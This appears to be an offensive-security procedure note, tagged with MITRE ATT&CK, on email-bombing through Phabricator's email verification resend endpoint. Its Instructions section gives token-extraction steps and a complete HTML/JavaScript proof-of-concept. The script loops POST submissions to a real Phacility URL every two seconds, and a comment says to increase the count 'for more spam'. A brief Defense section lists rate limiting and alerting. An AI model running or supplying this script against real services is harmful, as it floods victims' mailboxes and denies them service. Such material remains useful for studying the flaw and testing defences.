---
tags:
  - email-bombing
  - dos
  - api-abuse
  - phabricator
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:20.237Z'
sub_techniques: []
id: d68d82fd-d6bc-4a24-90ef-6a28761484fd
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
---

# Spam-Email-Verification-Requests-Using-PoC

## Summary

This procedure uses a custom HTML/JavaScript proof-of-concept to repeatedly submit requests to Phabricator's email verification endpoint, bypassing rate limits to flood a target mailbox with verification emails and cause denial-of-service.

## Description

The Phabricator email verification API at /settings/user/{username}/page/email/ lacks throttling in PhabricatorUserEmail.php, allowing unlimited POST requests to resend emails. After registering an account, extract the verification token and use JavaScript to automate submissions every 2 seconds, scalable to hundreds of emails. This targets web APIs and exploits improper access controls, impacting email services.

## Requirements

1. Registered Phabricator account with target email
2. Verification token from initial email
3. Local web server or browser to load HTML PoC
4. Text editor for PoC creation

## Defense

Defensive measures and detection strategies:

- Implement rate limiting (e.g., 5 requests per hour per IP/user) on resend functions
- Add CSRF checks and verification state validation before resends
- Log and alert on excessive email sends from verification endpoints
- Use email service quotas (e.g., SMTP limits)

## Objectives

1. Automate unlimited resend requests to verification endpoint
2. Overload target mailbox with spam emails
3. Achieve DoS on email delivery and access

## Instructions

### Step 1: Extract Verification Token

**Context**: Obtain the token needed for resend requests from the initial verification email or user settings page.

Log in to the Phabricator account (if possible) and navigate to Settings > Email, or parse the initial email link for the ?verify={token} parameter.

> Expected: Token string, e.g., "abc123def456".

### Step 2: Create and Load HTML PoC

**Context**: Build a simple HTML form that targets the resend endpoint and uses JavaScript to loop submissions.

Create an HTML file (e.g., poc.html) with the following content, replacing {username}, {verify_token}, and {csrf_token} with actual values (CSRF token from Phabricator session or form):

```html
<!DOCTYPE html>
<html>
<head><title>Email Bomb PoC</title></head>
<body>
<form id="verifyForm" method="POST" action="https://admin.phacility.com/settings/user/{username}/page/email/?verify={verify_token}">
    <input type="hidden" name="__csrf__" value="{csrf_token}">
    <input type="hidden" name="__form__" value="1">
    <input type="hidden" name="__dialog__" value="1">
    <input type="hidden" name="verify" value="{verify_token}">
    <input type="hidden" name="__submit__" value="true">
    <input type="hidden" name="__wflow__" value="true">
    <input type="hidden" name="__ajax__" value="true">
    <input type="hidden" name="__metablock__" value="3">
</form>
<script>
let count = 0;
const max = 100; // Increase for more spam
setInterval(() => {
    if (count < max) {
        document.getElementById('verifyForm').submit();
        count++;
        console.log('Sent ' + count);
    }
}, 2000);
</script>
</body>
</html>
```

Open the file in a browser logged into Phabricator (to maintain session/CSRF). The script will submit every 2 seconds.

> Expected: Console logs showing incremental sends; target mailbox receives emails rapidly.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[email-bombing]]
- [[dos]]
- [[api-abuse]]
- [[phabricator]]
